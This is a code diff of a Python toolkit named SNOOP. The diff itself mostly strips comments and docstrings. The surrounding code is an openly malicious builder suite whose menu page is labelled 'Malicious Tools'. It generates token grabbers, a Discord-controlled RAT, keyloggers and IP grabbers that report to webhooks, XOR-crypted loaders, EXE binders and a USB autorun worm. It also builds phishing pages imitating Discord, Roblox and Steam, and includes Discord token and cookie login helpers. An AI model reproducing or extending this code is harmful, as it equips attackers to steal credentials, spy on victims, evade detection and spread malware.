@@ -20,9 +20,6 @@ from concurrent.futures import ThreadPoolExecutor
 import ctypes
 import webbrowser
 
-# -------------------------------------------------------------------
-#  Project paths
-# -------------------------------------------------------------------
 BASE_DIR = Path(__file__).parent.absolute()
 STUB_DIR = BASE_DIR / "stub"
 MODULES_DIR = BASE_DIR / "modules"
@@ -41,9 +38,6 @@ logging.basicConfig(
 )
 logger = logging.getLogger("SNOOP")
 
-# -------------------------------------------------------------------
-#  Core UI imports
-# -------------------------------------------------------------------
 from core.display import (
     Theme, Colorate, Colors, clr, get_inpt, print_banner,
     boot_anim, matrix_effect, init_os, type_print
@@ -51,11 +45,7 @@ from core.display import (
 from core.paginated_ui import PaginatedUI, PAGES
 from core.themes import get_theme_colors, get_available_themes
 
-# -------------------------------------------------------------------
-#  Dependency installer (fallback)
-# -------------------------------------------------------------------
 def _init():
-    """Install missing dependencies automatically if not already present."""
     try:
         import pystyle, requests, selenium, dns.resolver, bs4, socks, websocket, piexif, exifread, mutagen, PyQt5, colorama, webdriver_manager, pillow, flask, werkzeug, aiohttp, psutil, whois, phonenumbers, pynput, pywin32, mnemonic, stem, pycryptodome
     except:
@@ -63,9 +53,6 @@ def _init():
 
 _init()
 
-# -------------------------------------------------------------------
-#  Imports (pystyle / colorama)
-# -------------------------------------------------------------------
 try:
     from pystyle import Colorate, Colors, Center, System
     PYSTYLE = True
@@ -97,11 +84,7 @@ except ImportError:
     DISCORD_TOOLS_AVAILABLE = False
     print("[!] discord_tools.py not found – Discord tools disabled")
 
-# -------------------------------------------------------------------
-#  Configuration helpers
-# -------------------------------------------------------------------
 def load_config():
-    """Load the global configuration from CONFIG_FILE."""
     if CONFIG_FILE.exists():
         try:
             with open(CONFIG_FILE, 'r', encoding='utf-8') as f:
@@ -111,7 +94,6 @@ def load_config():
     return {}
 
 def save_config(cfg):
-    """Save the global configuration to CONFIG_FILE."""
     try:
         CONFIG_FILE.parent.mkdir(parents=True, exist_ok=True)
         with open(CONFIG_FILE, 'w', encoding='utf-8') as f:
@@ -119,15 +101,10 @@ def save_config(cfg):
     except:
         pass
 
-# -------------------------------------------------------------------
-#  Utility functions
-# -------------------------------------------------------------------
 def validate_url(url):
-    """Check if the given string is a valid HTTP/HTTPS URL."""
     return url.startswith("http://") or url.startswith("https://")
 
 def select_icon():
-    """Open a file dialog to select an .ico file."""
     try:
         root = tkinter.Tk()
         root.withdraw()
@@ -138,10 +115,6 @@ def select_icon():
         return None
 
 def replace_webhook_assignment(text, new_url, keys):
-    """
-    Replace webhook assignments in a template string.
-    Returns (new_text, number_of_replacements).
-    """
     total = 0
     new_text = text
     for key in keys:
@@ -152,14 +125,7 @@ def replace_webhook_assignment(text, new_url, keys):
         total += n
     return new_text, total
 
-# -------------------------------------------------------------------
-#  PyInstaller wrapper
-# -------------------------------------------------------------------
 def compile_pyinstaller(source, name, icon_path=None, console=False, onefile=True, extra_hidden=None):
-    """
-    Compile a Python script into an executable using PyInstaller.
-    Returns True on success, False otherwise.
-    """
     if extra_hidden is None:
         extra_hidden = []
     cmd = [sys.executable, "-m", "PyInstaller", "--clean", "--noconfirm"]
@@ -195,7 +161,8 @@ def compile_pyinstaller(source, name, icon_path=None, console=False, onefile=Tru
         "aiohttp", "mss", "psutil", "cv2", "pyautogui", "pynput",
         "browserhistory", "pyaudio", "wave", "numpy", "pyperclip",
         "win32service", "win32serviceutil", "comtypes", "win32net",
-        "win32evtlog", "win32security", "flask", "werkzeug"
+        "win32evtlog", "win32security", "flask", "werkzeug",
+        "threading"
     ] + extra_hidden
     hidden = list(set(hidden))
     for h in hidden:
@@ -217,11 +184,7 @@ def compile_pyinstaller(source, name, icon_path=None, console=False, onefile=Tru
     except:
         return False
 
-# -------------------------------------------------------------------
-#  Builder functions (payload generators)
-# -------------------------------------------------------------------
 def build_grabber(webhook, output_name, icon_path=None, as_exe=False):
-    """Generate a Grabber payload (Python or EXE)."""
     base = STUB_DIR / "base_code.py"
     if not base.exists():
         print(f"{Fore.RED}[!] base_code.py not found.{Style.RESET_ALL}")
@@ -237,7 +200,6 @@ def build_grabber(webhook, output_name, icon_path=None, as_exe=False):
     return True
 
 def build_rat(token, channel_id, output_name, icon_path=None, console=False, onefile=True):
-    """Generate a RAT payload (Python -> EXE)."""
     template = STUB_DIR / "rat_template.py"
     if not template.exists():
         print(f"{Fore.RED}[!] rat_template.py not found.{Style.RESET_ALL}")
@@ -253,7 +215,6 @@ def build_rat(token, channel_id, output_name, icon_path=None, console=False, one
     return success
 
 def build_ip_grabber(webhook, output_name, icon_path=None, as_exe=False):
-    """Generate an IP Grabber payload."""
     template = STUB_DIR / "ip_grabber_template.py"
     if not template.exists():
         print(f"{Fore.RED}[!] ip_grabber_template.py not found.{Style.RESET_ALL}")
@@ -269,7 +230,6 @@ def build_ip_grabber(webhook, output_name, icon_path=None, as_exe=False):
     return True
 
 def build_keylogger(webhook, output_name, icon_path=None, as_exe=False):
-    """Generate a Keylogger payload."""
     template = STUB_DIR / "keylogger_template.py"
     if not template.exists():
         print(f"{Fore.RED}[!] keylogger_template.py not found.{Style.RESET_ALL}")
@@ -286,7 +246,6 @@ def build_keylogger(webhook, output_name, icon_path=None, as_exe=False):
     return True
 
 def build_blocker(webhook, command_url, output_name, check_interval=10, startup=True, self_destruct_days=14, icon_path=None, as_exe=False):
-    """Generate a Blocker payload."""
     template = STUB_DIR / "blocker_template.py"
     if not template.exists():
         print(f"{Fore.RED}[!] blocker_template.py not found.{Style.RESET_ALL}")
@@ -307,7 +266,6 @@ def build_blocker(webhook, command_url, output_name, check_interval=10, startup=
     return True
 
 def build_binder(exe1_path, exe2_path, output_name):
-    """Bind two executables into one."""
     if not Path(exe1_path).exists() or not Path(exe2_path).exists():
         print(f"{Fore.RED}[!] One of the EXE files not found.{Style.RESET_ALL}")
         return False
@@ -332,7 +290,6 @@ if __name__ == "__main__":
     return success
 
 def build_crypter(exe_path, output_name):
-    """Crypt an executable (XOR + loader)."""
     if not Path(exe_path).exists():
         print(f"{Fore.RED}[!] EXE file not found.{Style.RESET_ALL}")
         return False
@@ -357,7 +314,6 @@ sys.exit()
     return success
 
 def build_fusion(output_name, icon_path=None):
-    """Merge Grabber and RAT into one payload."""
     grabber_template = STUB_DIR / "base_code.py"
     rat_template = STUB_DIR / "rat_template.py"
     if not grabber_template.exists() or not rat_template.exists():
@@ -406,7 +362,6 @@ if __name__ == "__main__":
     return success
 
 def build_crypted_rat(token, channel_id, output_name, icon_path=None, console=False, onefile=True):
-    """Build an encrypted RAT (XOR + loader)."""
     template = STUB_DIR / "rat_template.py"
     if not template.exists():
         print(f"{Fore.RED}[!] rat_template.py not found.{Style.RESET_ALL}")
@@ -443,7 +398,6 @@ if __name__ == "__main__":
     return success
 
 def build_crypted_grabber(webhook, output_name, icon_path=None, console=False, onefile=True):
-    """Build an encrypted Grabber (XOR + loader)."""
     template = STUB_DIR / "base_code.py"
     if not template.exists():
         print(f"{Fore.RED}[!] base_code.py not found.{Style.RESET_ALL}")
@@ -479,7 +433,6 @@ if __name__ == "__main__":
     return success
 
 def build_usb_worm():
-    """Create a USB worm folder with autorun."""
     print(f"{Fore.CYAN}[*] USB Worm Generator{Style.RESET_ALL}")
     exe_path = input("Path to EXE to copy to USB: ").strip()
     if not Path(exe_path).exists():
@@ -502,7 +455,6 @@ def build_usb_worm():
     print(f"{Fore.GREEN}[+] USB Worm folder created at {output_dir}{Style.RESET_ALL}")
 
 def build_network_scanner():
-    """Generate a network scanner executable."""
     print(f"{Fore.CYAN}[*] Advanced Network Scanner Generator{Style.RESET_ALL}")
     output_name = input("Output EXE name [NetworkScanner]: ").strip() or "NetworkScanner"
     scanner = '''import socket, threading, os, time, sys, ipaddress
@@ -563,7 +515,6 @@ if __name__ == "__main__": main()
     temp.unlink()
 
 def build_phishing_page():
-    """Generate a phishing page (Discord/Roblox/Steam/Custom)."""
     print(f"{Fore.CYAN}[*] Phishing Page Generator{Style.RESET_ALL}")
     print("  1. Discord\n  2. Roblox\n  3. Steam\n  4. Custom")
     choice = input("Your choice (1-4): ").strip()
@@ -647,11 +598,7 @@ if __name__ == '__main__': app.run(host='0.0.0.0', port=8080, debug=False)
     shutil.make_archive("Phishing_Page", 'zip', output_dir)
     print(f"{Fore.GREEN}[+] Phishing folder generated: {output_dir}{Style.RESET_ALL}")
 
-# -------------------------------------------------------------------
-#  Login helpers (Discord token / cookie)
-# -------------------------------------------------------------------
 def discord_token_login(token):
-    """Log in to Discord using a token (Selenium)."""
     try:
         from selenium import webdriver
         from selenium.webdriver.chrome.service import Service as ChromeService
@@ -678,7 +625,6 @@ def discord_token_login(token):
     input("\nPress Enter...")
 
 def cookie_login():
-    """Inject cookies into the browser to log in to a website."""
     cookie_str = input(f"{Fore.YELLOW}Cookie (name=value; ...): {Style.RESET_ALL}").strip()
     if not cookie_str: return
     url = input(f"{Fore.YELLOW}Target URL: {Style.RESET_ALL}").strip()
@@ -707,7 +653,6 @@ def cookie_login():
     input("\nPress Enter...")
 
 def run_roblox_tools():
-    """Launch the Roblox tools module."""
     roblox_script = STUB_DIR / "roblox.py"
     if roblox_script.exists():
         try:
@@ -719,11 +664,7 @@ def run_roblox_tools():
         print(f"{Fore.RED}[!] roblox.py not found in stub/{Style.RESET_ALL}")
         input("Press Enter...")
 
-# -------------------------------------------------------------------
-#  Menu helpers (help, version, settings)
-# -------------------------------------------------------------------
 def help_menu():
-    """Display the help menu."""
     clr()
     cfg = load_config()
     ver = cfg.get("version", "1.0.0")
@@ -758,7 +699,6 @@ def help_menu():
     input("\nPress Enter to continue...")
 
 def version_menu():
-    """Display the version information."""
     clr()
     print_banner()
     cfg = load_config()
@@ -778,7 +718,6 @@ def version_menu():
     input("\nPress Enter to continue...")
 
 def settings_menu():
-    """Manage application settings (themes, clear configuration)."""
     config = load_config()
     while True:
         clr()
@@ -835,11 +774,7 @@ def settings_menu():
         print(f"{Fore.RED}[!] Invalid choice.{Style.RESET_ALL}")
         input("Press Enter...")
 
-# -------------------------------------------------------------------
-#  Page handlers for run_app()
-# -------------------------------------------------------------------
 def handle_page_0(choice):
-    """Handle tools from Page 0 (Malicious Tools)."""
     if choice in ["1", "01"]:
         webhook = input("Webhook URL: ").strip()
         if not validate_url(webhook):
@@ -957,7 +892,6 @@ def handle_page_0(choice):
         input("Press Enter...")
 
 def handle_page_1(choice):
-    """Handle tools from Page 1 (Discord Tools)."""
     if choice in ["1", "01"]:
         script_path = STUB_DIR / "discord_selfbot.py"
         if script_path.exists():
@@ -1019,7 +953,6 @@ def handle_page_1(choice):
         input("Press Enter...")
 
 def handle_page_2(choice):
-    """Handle tools from Page 2 (OSINT)."""
     osint_scripts = {'1':'osint_ip.py','01':'osint_ip.py','2':'osint_email.py','02':'osint_email.py',
                     '3':'osint_phone.py','03':'osint_phone.py','4':'osint_username.py','04':'osint_username.py',
                     '5':'osint_domain.py','05':'osint_domain.py','6':'osint_dns.py','06':'osint_dns.py',
@@ -1039,7 +972,6 @@ def handle_page_2(choice):
         input("Press Enter...")
 
 def handle_page_3(choice):
-    """Handle tools from Page 3 (Tools)."""
     if choice in ["1", "01"]:
         exe1 = input("Path to 1st EXE: ").strip()
         exe2 = input("Path to 2nd EXE: ").strip()
@@ -1121,7 +1053,6 @@ def handle_page_3(choice):
         input("Press Enter...")
 
 def handle_page_4(choice):
-    """Handle tools from Page 4 (Login)."""
     if choice in ["1", "01"]:
         token = input(f"{Fore.YELLOW}Discord token: {Style.RESET_ALL}").strip()
         if token: discord_token_login(token)
@@ -1133,18 +1064,13 @@ def handle_page_4(choice):
         input("Press Enter...")
 
 def handle_page_5(choice):
-    """Handle tools from Page 5 (Roblox)."""
     if choice in ["1", "01", "2", "02", "3", "03", "4", "04", "5", "05", "6", "06", "7", "07", "8", "08", "9", "09"]:
         run_roblox_tools()
     else:
         print(f"{Fore.RED}[!] Invalid choice.{Style.RESET_ALL}")
         input("Press Enter...")
 
-# -------------------------------------------------------------------
-#  Main application loop
-# -------------------------------------------------------------------
 def run_app():
-    """Main application loop with paginated dashboard."""
     config = load_config()
     current_page = 0
 
@@ -1157,7 +1083,6 @@ def run_app():
         PaginatedUI.draw_dashboard(current_page)
         choice = get_inpt().strip().lower()
 
-        # Navigation
         if choice in ("n", "d"):
             current_page = (current_page + 1) % len(PAGES)
             continue
@@ -1174,7 +1099,6 @@ def run_app():
         elif not choice:
             continue
 
-        # Global commands
         if choice == "h":
             help_menu()
             continue
@@ -1186,7 +1110,6 @@ def run_app():
             current_page = 0
             continue
 
-        # Page-specific handlers
         if current_page == 0:
             handle_page_0(choice)
         elif current_page == 1:
@@ -1203,9 +1126,6 @@ def run_app():
             print(f"{Fore.RED}[!] Invalid page.{Style.RESET_ALL}")
             input("Press Enter...")
 
-# -------------------------------------------------------------------
-#  Entry point
-# -------------------------------------------------------------------
 if __name__ == '__main__':
     init_os()
     boot_anim()
